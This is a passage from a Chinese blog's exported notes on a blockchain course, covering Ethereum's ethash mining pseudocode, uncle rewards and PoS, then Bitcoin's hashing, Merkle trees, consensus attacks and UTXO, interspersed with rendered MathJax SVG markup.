619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\" transform=\"translate(500,0)\"/></g><rect width=\"907.1\" height=\"60\" x=\"120\" y=\"220\"/></g></g></g></svg></mjx-container></span>\n倍额外的出块奖励。（这个没有变）</p>\n<p>如果叔叔区块后面还有区块怎么办？给钱吗？不能给钱。</p>\n<p>如果叔叔区块后面的区块也给钱，那分叉攻击就太便宜了，分叉攻击失败了还有奖励。</p>\n<h1 id=\"挖矿算法\">6 挖矿算法</h1>\n<p>ASIC Resistance</p>\n<p>以太坊的方法是，增加芯片对内存访问的需求。因为 ASIC\n芯片的主要优势是计算，而访存性能并没有优势。</p>\n<h2 id=\"ethash-伪代码实现\">6.1 ethash 伪代码实现</h2>\n<ul>\n<li><p>16M 的 cache，是根据一个种子算出来的哈希列表</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mkcache</span>(<span class=\"params\">cache_size, seed</span>):</span><br><span class=\"line\">    o = [<span class=\"built_in\">hash</span>(seed)]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, cache_size):</span><br><span class=\"line\">        o.append(<span class=\"built_in\">hash</span>(o[-<span class=\"number\">1</span>]))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> o</span><br></pre></td></tr></table></figure>\n<p>细节：每隔30000个块重新生成一个seed更新cache，并增大cache_size\n128K。（增大 cache_size\n的目的是随着硬件访存效率的提升稳定挖矿难度）</p></li>\n<li><p>1G 的 dataset，叫做 DAG，是通过 cache 来生成的一个数据集。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">calc_dataset_item</span>(<span class=\"params\">cache, i</span>):</span><br><span class=\"line\">\tcache_size = cache.size</span><br><span class=\"line\">    mix = <span class=\"built_in\">hash</span>(cache[i % cache_size] ^ i)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">256</span>):</span><br><span class=\"line\">        cache_index = get_int_from_item(mix)</span><br><span class=\"line\">        mix = make_item(mix, cache[cache_index % cache_size])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">hash</span>(mix)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cal_dataset</span>(<span class=\"params\">full_size, cache</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [calc_dataset_item(cache, i) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(full_size)]</span><br></pre></td></tr></table></figure>\n<p>上面的函数用来计算第 i 个 dataset 中的元素。每一个元素的计算需要重复\n256 次hash和访问cache内存。</p></li>\n<li><p>下面就是全节点和轻节点挖矿的 ethash ：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">hashimoto_full</span>(<span class=\"params\">header, nonce, full_size, dataset</span>):</span><br><span class=\"line\">    mix = <span class=\"built_in\">hash</span>(header, nonce)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">64</span>):</span><br><span class=\"line\">        dataset_index = get_int_from_item(mix) % full_size <span class=\"comment\"># 获取一个dataset中的下标</span></span><br><span class=\"line\">        mix = make_item(mix, dataset[dataset_index])</span><br><span class=\"line\">        mix = make_item(mix, dataset[dataset_index + <span class=\"number\">1</span>]) <span class=\"comment\"># 每次取出两个元素，接到mix后面</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">hash</span>(mix)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">hashimoto_light</span>(<span class=\"params\">header, nonce, full_size, cache</span>): <span class=\"comment\"># 轻节点不用1G的dataset，只用16M的cache</span></span><br><span class=\"line\">    mix = <span class=\"built_in\">hash</span>(header, nonce)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">64</span>):</span><br><span class=\"line\">        dataset_index = get_int_from_item(mix) % full_size</span><br><span class=\"line\">        mix = make_item(mix, calc_dataset_item(cache, dataset_index))</span><br><span class=\"line\">        mix = make_item(mix, calc_dataset_item(cache, dataset_index + <span class=\"number\">1</span>)) <span class=\"comment\"># 每次重新计算两个元素</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">hash</span>(mix)  </span><br></pre></td></tr></table></figure>\n<p>矿工需要保存1G的数据库，频繁访问来计算hash，判断区块是否符合难度要求。为了计算方便，把dataset的值缓存下来最快。而频繁的访存又让访存成为了性能瓶颈。</p>\n<p>轻节点为了节省空间，并且也不需要频繁计算hash，所以只有用到的时候再重新计算一次即可。</p></li>\n<li><p>挖矿函数：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mine</span>(<span class=\"params\">full_size, dataset, header, target</span>):</span><br><span class=\"line\">    nonce = random.randint(<span class=\"number\">0</span>, <span class=\"number\">2</span>**<span class=\"number\">64</span>)</span><br><span class=\"line\">    <span class=\"keyword\">while</span> hashimoto_full(header, nonce, full_size, dataset) &gt; target:</span><br><span class=\"line\">        nonce = (nonce + <span class=\"number\">1</span>) % <span class=\"number\">2</span>**<span class=\"number\">64</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> nonce</span><br></pre></td></tr></table></figure></li>\n</ul>\n<h1 id=\"挖矿难度\">7 挖矿难度</h1>\n<blockquote>\n<p>该部分可能已经过时了，毕竟目前以太坊已经全面转为 PoS 了。</p>\n<p>就不细看实现了</p>\n</blockquote>\n<h1 id=\"权益证明-pos\">8 权益证明 PoS</h1>\n<p>Proof of Stake。</p>\n<p>PoW需要人们大量购买矿机进行挖矿，最终变成比拼算力、进一步变成比拼财力的游戏。</p>\n<p>PoS的基本思想就是，既然是比拼财力，不如直接把钱给以太坊用于支持以太坊的开发。</p>\n<p>这课讲的有点简略了……</p>\n<h1 id=\"智能合约\">9 智能合约</h1>\n<blockquote>\n<p>略过了这一节，可能会落一些不知道细节，大体上对智能合约的了解还是比较足够了</p>\n</blockquote>\n<h1 id=\"the-dao\">10 The DAO</h1>\n<p>DAO：去中心化的自治组织。</p>\n<p>The DAO：是一个具体的运行在以太坊上的智能合约。</p>\n<p>这部分在 ethernaut 里也了解过了。</p>\n<p>精彩的故事，但是不太有知识点。</p>\n<p>后续有一节美链，也是在 ethernaut 里了解过了。</p>\n<h1 id=\"反思\">11 反思</h1>\n<p>智能合约不智能。</p>\n<p>不可篡改性是一个双刃剑。</p>\n<p>没有什么是不可篡改的。</p>\n<p>Solidity是好的编程语言吗？</p>\n<p>智能合约开源真的更安全吗？（TEE，加密智能合约）</p>\n<p>去中心化意味着什么？</p>\n<p>去中心化并不是全自动化；去中心化并不是不能修改规则，而是应该用去中心化的方法修改规则。</p>\n<p>去中心化不等于分布式。去中心化系统必然是分布式的，分布式系统不一定是去中心化的。</p>\n","categories":["笔记"],"tags":["区块链","以太坊","毕设"]},{"title":"区块链技术与应用01 - 比特币","url":"/blockchain/tutorial/tutorial-01/","content":"<p>在B站看到北京大学肖臻老师的《区块链技术与应用》公开课，跟着学一学。</p>\n<span id=\"more\"></span>\n<h1 id=\"密码学原理\">1 密码学原理</h1>\n<h2 id=\"哈希函数\">1.1 哈希函数</h2>\n<p>cryptographic hash function（加密哈希函数）</p>\n<ul>\n<li>输出结果为 256 位整数，即 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: 0;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"3.719ex\" height=\"1.887ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -833.9 1643.7 833.9\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msup\"><g data-mml-node=\"mn\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(533,363) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mn\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/><path data-c=\"35\" d=\"M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z\" transform=\"translate(500,0)\"/><path data-c=\"36\" d=\"M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z\" transform=\"translate(1000,0)\"/></g></g></g></g></g></svg></mjx-container></span> 个不同的结果</li>\n<li>collision\nresistance（碰撞抗性）：目前没有一个高效的方法可以人为地构造哈希碰撞</li>\n<li>hiding：计算过程不可逆</li>\n<li>puzzle\nfriendly：不能预先知道哪个范围的输入可以得到某个特定的哈希值</li>\n</ul>\n<p>比特币用的哈希函数是 SHA 256</p>\n<h2 id=\"签名\">1.2 签名</h2>\n<p>非对称加密，生成公私钥。</p>\n<p>前提：一个好的随机源。</p>\n<blockquote>\n<p><strong>如何保证随机源的质量：</strong></p>\n<ul>\n<li><strong>硬件随机数生成器（HRNG）</strong>：利用物理现象生成随机数，是目前公认的高质量随机数来源。</li>\n<li><strong>密码学安全伪随机数生成器（CSPRNG）</strong>：通过安全算法生成随机数，输入熵应来自可信的物理源。</li>\n<li><strong>系统熵池</strong>：操作系统通常会维护一个熵池，用于生成随机数（如Linux中的/dev/random或/dev/urandom）。</li>\n</ul>\n</blockquote>\n<h1 id=\"数据结构\">2 数据结构</h1>\n<p>哈希链表和默克尔树。</p>\n<p>简要提炼一下核心思想：</p>\n<ul>\n<li>哈希指针是某一个结构体的哈希值，根据加密哈希函数的特性，认为只有完全相同的结构体可以计算得到同样的哈希值</li>\n<li>哈希链表和默克尔树原型是链表和二叉树，但是把普通指针改为哈希指针，用于判断一个集和中是否有元素被篡改</li>\n<li>进一步，通过默克尔树的性质可以实现选择性披露</li>\n</ul>\n<p>区块链是一个哈希链表，区块内的交易是以默克尔树的结构存储的。</p>\n<p>每一个区块的header里存有该区块交易的默克尔树树根。</p>\n<h1 id=\"共识协议\">3 共识协议</h1>\n<h2 id=\"区块构成\">3.1 区块构成</h2>\n<table>\n<thead>\n<tr>\n<th>header</th>\n<th>body</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>版本（version）</td>\n<td>交易列表</td>\n</tr>\n<tr>\n<td>前一个区块的块头的哈希值</td>\n<td></td>\n</tr>\n<tr>\n<td>默克尔树根</td>\n<td></td>\n</tr>\n<tr>\n<td>挖矿难度（target）</td>\n<td></td>\n</tr>\n<tr>\n<td>随机数（nouce）</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"攻击\">3.2 攻击</h2>\n<h3 id=\"双花攻击\">3.2.1 双花攻击</h3>\n<p>双花攻击（double spending\nattack）：如何验证账户中的某一笔钱没有被花两次。</p>\n<p>比特币的方式是，记录每一笔交易的货币的<strong>出处</strong>。检查这个出处的钱在链上是不是已经被使用过了。</p>\n<p>这个校验方式，也防止了伪造交易进行攻击。</p>\n<blockquote>\n<p>这一部分实在不好概括，不想写的太复杂，如果之后看不懂了回去再看一遍视频吧</p>\n</blockquote>\n<h3 id=\"女巫攻击分叉攻击\">3.2.2 女巫攻击&amp;分叉攻击</h3>\n<p>女巫攻击（sybil\nattack）：投票共识，如果一个恶意组织产生大量节点，直到其控制超过一半的节点，接获得了整个区块链的投票控制权。</p>\n<p>分叉攻击（forking attack）：通过分叉区块链来回滚已经成功的交易。</p>\n<p>这两个攻击的本质都是恶意节点非法掌握记账权，来控制区块链的生成。</p>\n<p>比特币防止女巫攻击和分叉共计的方式，就是工作量证明（PoW），计算一个\nheader，使其满足：</p>\n<p><span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"25.026ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 11061.6 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D43B\" d=\"M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 219 683Q260 681 355 681Q389 681 418 681T463 682T483 682Q499 682 499 672Q499 670 497 658Q492 641 487 638H485Q483 638 480 638T473 638T464 637T455 637Q416 636 405 634T387 623Q384 619 355 500Q348 474 340 442T328 395L324 380Q324 378 469 378H614L615 381Q615 384 646 504Q674 619 674 627T617 637Q594 637 587 639T580 648Q580 650 582 660Q586 677 588 679T604 682Q609 682 646 681T740 680Q802 680 835 681T871 682Q888 682 888 672Q888 645 876 638H874Q872 638 869 638T862 638T853 637T844 637Q805 636 794 634T776 623Q773 618 704 340T634 58Q634 51 638 51Q646 48 692 46H723Q729 38 729 37T726 19Q722 6 716 0H701Q664 2 567 2Q533 2 504 2T458 2T437 1Q420 1 420 10Q420 15 423 24Q428 43 433 45Q437 46 448 46H454Q481 46 514 49Q520 50 522 50T528 55T534 64T540 82T547 110T558 153Q565 181 569 198Q602 330 602 331T457 332H312L279 197Q245 63 245 58Q245 51 253 49T303 46H334Q340 38 340 37T337 19Q333 6 327 0H312Q275 2 178 2Q144 2 115 2T69 2T48 1Q31 1 31 10Q31 12 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(888,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mtext\" transform=\"translate(1277,0)\"><path data-c=\"62\" d=\"M307 -11Q234 -11 168 55L158 37Q156 34 153 28T147 17T143 10L138 1L118 0H98V298Q98 599 97 603Q94 622 83 628T38 637H20V660Q20 683 22 683L32 684Q42 685 61 686T98 688Q115 689 135 690T165 693T176 694H179V543Q179 391 180 391L183 394Q186 397 192 401T207 411T228 421T254 431T286 439T323 442Q401 442 461 379T522 216Q522 115 458 52T307 -11ZM182 98Q182 97 187 90T196 79T206 67T218 55T233 44T250 35T271 29T295 26Q330 26 363 46T412 113Q424 148 424 212Q424 287 412 323Q385 405 300 405Q270 405 239 390T188 347L182 339V98Z\"/><path data-c=\"6C\" d=\"M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z\" transform=\"translate(556,0)\"/><path data-c=\"6F\" d=\"M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z\" transform=\"translate(834,0)\"/><path data-c=\"63\" d=\"M370 305T349 305T313 320T297 358Q297 381 312 396Q317 401 317 402T307 404Q281 408 258 408Q209 408 178 376Q131 329 131 219Q131 137 162 90Q203 29 272 29Q313 29 338 55T374 117Q376 125 379 127T395 129H409Q415 123 415 120Q415 116 411 104T395 71T366 33T318 2T249 -11Q163 -11 99 53T34 214Q34 318 99 383T250 448T370 421T404 357Q404 334 387 320Z\" transform=\"translate(1334,0)\"/><path data-c=\"6B\" d=\"M36 46H50Q89 46 97 60V68Q97 77 97 91T97 124T98 167T98 217T98 272T98 329Q98 366 98 407T98 482T98 542T97 586T97 603Q94 622 83 628T38 637H20V660Q20 683 22 683L32 684Q42 685 61 686T98 688Q115 689 135 690T165 693T176 694H179V463L180 233L240 287Q300 341 304 347Q310 356 310 364Q310 383 289 385H284V431H293Q308 428 412 428Q475 428 484 431H489V385H476Q407 380 360 341Q286 278 286 274Q286 273 349 181T420 79Q434 60 451 53T500 46H511V0H505Q496 3 418 3Q322 3 307 0H299V46H306Q330 48 330 65Q330 72 326 79Q323 84 276 153T228 222L176 176V120V84Q176 65 178 59T189 49Q210 46 238 46H254V0H246Q231 3 137 3T28 0H20V46H36Z\" transform=\"translate(1778,0)\"/><path data-c=\"20\" d=\"\" transform=\"translate(2306,0)\"/><path data-c=\"68\" d=\"M41 46H55Q94 46 102 60V68Q102 77 102 91T102 124T102 167T103 217T103 272T103 329Q103 366 103 407T103 482T102 542T102 586T102 603Q99 622 88 628T43 637H25V660Q25 683 27 683L37 684Q47 685 66 686T103 688Q120 689 140 690T170 693T181 694H184V367Q244 442 328 442Q451 442 463 329Q464 322 464 190V104Q464 66 466 59T477 49Q498 46 526 46H542V0H534L510 1Q487 2 460 2T422 3Q319 3 310 0H302V46H318Q379 46 379 62Q380 64 380 200Q379 335 378 343Q372 371 358 385T334 402T308 404Q263 404 229 370Q202 343 195 315T187 232V168V108Q187 78 188 68T191 55T200 49Q221 46 249 46H265V0H257L234 1Q210 2 183 2T145 3Q42 3 33 0H25V46H41Z\" transform=\"translate(2556,0)\"/><path data-c=\"65\" d=\"M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z\" transform=\"translate(3112,0)\"/><path data-c=\"61\" d=\"M137 305T115 305T78 320T63 359Q63 394 97 421T218 448Q291 448 336 416T396 340Q401 326 401 309T402 194V124Q402 76 407 58T428 40Q443 40 448 56T453 109V145H493V106Q492 66 490 59Q481 29 455 12T400 -6T353 12T329 54V58L327 55Q325 52 322 49T314 40T302 29T287 17T269 6T247 -2T221 -8T190 -11Q130 -11 82 20T34 107Q34 128 41 147T68 188T116 225T194 253T304 268H318V290Q318 324 312 340Q290 411 215 411Q197 411 181 410T156 406T148 403Q170 388 170 359Q170 334 154 320ZM126 106Q126 75 150 51T209 26Q247 26 276 49T315 109Q317 116 318 175Q318 233 317 233Q309 233 296 232T251 223T193 203T147 166T126 106Z\" transform=\"translate(3556,0)\"/><path data-c=\"64\" d=\"M376 495Q376 511 376 535T377 568Q377 613 367 624T316 637H298V660Q298 683 300 683L310 684Q320 685 339 686T376 688Q393 689 413 690T443 693T454 694H457V390Q457 84 458 81Q461 61 472 55T517 46H535V0Q533 0 459 -5T380 -11H373V44L365 37Q307 -11 235 -11Q158 -11 96 50T34 215Q34 315 97 378T244 442Q319 442 376 393V495ZM373 342Q328 405 260 405Q211 405 173 369Q146 341 139 305T131 211Q131 155 138 120T173 59Q203 26 251 26Q322 26 373 103V342Z\" transform=\"translate(4056,0)\"/><path data-c=\"65\" d=\"M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z\" transform=\"translate(4612,0)\"/><path data-c=\"72\" d=\"M36 46H50Q89 46 97 60V68Q97 77 97 91T98 122T98 161T98 203Q98 234 98 269T98 328L97 351Q94 370 83 376T38 385H20V408Q20 431 22 431L32 432Q42 433 60 434T96 436Q112 437 131 438T160 441T171 442H174V373Q213 441 271 441H277Q322 441 343 419T364 373Q364 352 351 337T313 322Q288 322 276 338T263 372Q263 381 265 388T270 400T273 405Q271 407 250 401Q234 393 226 386Q179 341 179 207V154Q179 141 179 127T179 101T180 81T180 66V61Q181 59 183 57T188 54T193 51T200 49T207 48T216 47T225 47T235 46T245 46H276V0H267Q249 3 140 3Q37 3 28 0H20V46H36Z\" transform=\"translate(5056,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(6725,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(7391.8,0)\"><path data-c=\"2264\" d=\"M674 636Q682 636 688 630T694 615T687 601Q686 600 417 472L151 346L399 228Q687 92 691 87Q694 81 694 76Q694 58 676 56H670L382 192Q92 329 90 331Q83 336 83 348Q84 359 96 365Q104 369 382 500T665 634Q669 636 674 636ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z\"/></g><g data-mml-node=\"mtext\" transform=\"translate(8447.6,0)\"><path data-c=\"74\" d=\"M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z\"/><path data-c=\"61\" d=\"M137 305T115 305T78 320T63 359Q63 394 97 421T218 448Q291 448 336 416T396 340Q401 326 401 309T402 194V124Q402 76 407 58T428 40Q443 40 448 56T453 109V145H493V106Q492 66 490 59Q481 29 455 12T400 -6T353 12T329 54V58L327 55Q325 52 322 49T314 40T302 29T287 17T269 6T247 -2T221 -8T190 -11Q130 -11 82 20T34 107Q34 128 41 147T68 188T116 225T194 253T304 268H318V290Q318 324 312 340Q290 411 215 411Q197 411 181 410T156 406T148 403Q170 388 170 359Q170 334 154 320ZM126 106Q126 75 150 51T209 26Q247 26 276 49T315 109Q317 116 318 175Q318 233 317 233Q309 233 296 232T251 223T193 203T147 166T126 106Z\" transform=\"translate(389,0)\"/><path data-c=\"72\" d=\"M36 46H50Q89 46 97 60V68Q97 77 97 91T98 122T98 161T98 203Q98 234 98 269T98 328L97 351Q94 370 83 376T38 385H20V408Q20 431 22 431L32 432Q42 433 60 434T96 436Q112 437 131 438T160 441T171 442H174V373Q213 441 271 441H277Q322 441 343 419T364 373Q364 352 351 337T313 322Q288 322 276 338T263 372Q263 381 265 388T270 400T273 405Q271 407 250 401Q234 393 226 386Q179 341 179 207V154Q179 141 179 127T179 101T180 81T180 66V61Q181 59 183 57T188 54T193 51T200 49T207 48T216 47T225 47T235 46T245 46H276V0H267Q249 3 140 3Q37 3 28 0H20V46H36Z\" transform=\"translate(889,0)\"/><path data-c=\"67\" d=\"M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z\" transform=\"translate(1281,0)\"/><path data-c=\"65\" d=\"M28 218Q28 273 48 318T98 391T163 433T229 448Q282 448 320 430T378 380T406 316T415 245Q415 238 408 231H126V216Q126 68 226 36Q246 30 270 30Q312 30 342 62Q359 79 369 104L379 128Q382 131 395 131H398Q415 131 415 121Q415 117 412 108Q393 53 349 21T250 -11Q155 -11 92 58T28 218ZM333 275Q322 403 238 411H236Q228 411 220 410T195 402T166 381T143 340T127 274V267H333V275Z\" transform=\"translate(1781,0)\"/><path data-c=\"74\" d=\"M27 422Q80 426 109 478T141 600V615H181V431H316V385H181V241Q182 116 182 100T189 68Q203 29 238 29Q282 29 292 100Q293 108 293 146V181H333V146V134Q333 57 291 17Q264 -10 221 -10Q187 -10 162 2T124 33T105 68T98 100Q97 107 97 248V385H18V422H27Z\" transform=\"translate(2225,0)\"/></g></g></g></svg></mjx-container></span></p>\n<p>只有计算出这个 header 的节点才能把区块写入区块链。</p>\n<p>比特币的共识方式并不是投票共识，而是简单粗暴的谁先挖出区块就听谁的，所以有多少个女巫节点都无法影响控制权。</p>\n<p>然而正常情况下，区块链也有可能发生分叉（比如由于网络延迟，一段时间内有两个不同的区块被挖出来，都被接在区块链的最后）。</p>\n<p>比特币允许分叉存在，其他节点会自己选择在哪个分叉后面添加区块，直到某一个分叉更长（这里应该有一些细节约束，比如保持多少时间、长几个区块），就信任这个更长的区块为可信的。</p>\n<blockquote>\n<p>补充：这里的最长链规则，实际上是累计工作量最大的链</p>\n</blockquote>\n<p>挖矿消耗算力极大，并且比特币的奖励机制鼓励大量节点来挖矿，攻击者必须要挖的非常快，让自己的分叉比别人的都长，才算攻击成功。然而，这过于昂贵的算力消耗让这种攻击方式很难成功。</p>\n<h1 id=\"比特币的实现\">4 比特币的实现</h1>\n<p>比特币使用基于账本的模式，以太坊使用基于账户的模式。</p>\n<p>这就是为什么比特币转账交易要说明币的来源，安全但是复杂抵消。</p>\n<h2 id=\"utxo\">4.1 UTXO</h2>\n<p>一个交易的结构示意图如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">A --┬-------&gt; B (5 BTC)</span><br><span class=\"line\">    └-------&gt; C (3 BTC)</span><br></pre></td></tr></table></figure>\n<p>A给B转了5个比特币，给C转了3个比特币。</p>\n<p>给UTXO，Unspend transaction\noutput，就是把所有没有被用掉的比特币存一个集和，用于双花攻击的检测。</p>\n<h2 id=\"激励机制\">4.2 激励机制</h2>\n<p>除了出块奖励，还有交易费，用于鼓励矿工把更多的交易存入区块。</p>\n<h2 id=\"nonce\">4.3 nonce</h2>\n<p>nonce的类型是 uint32 ，目前的出块难度下，遍历完 <span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: 0;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"2.919ex\" height=\"1.887ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -833.9 1290.1 833.9\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msup\"><g data-mml-node=\"mn\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 